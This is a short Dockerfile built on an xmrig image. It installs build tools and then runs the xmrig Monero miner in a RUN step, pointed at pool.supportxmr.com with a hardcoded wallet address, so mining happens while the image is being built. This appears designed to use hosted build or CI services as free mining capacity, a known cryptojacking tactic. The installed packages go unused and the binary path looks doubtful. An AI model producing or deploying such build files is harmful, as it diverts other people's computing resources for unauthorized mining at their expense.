FROM xmrig/xmrig
RUN apk update && \
    apk add git make g++ cmake \
        libuv-dev libmicrohttpd-dev --no-cache
RUN xmrig/xmrig -o pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir  -p x
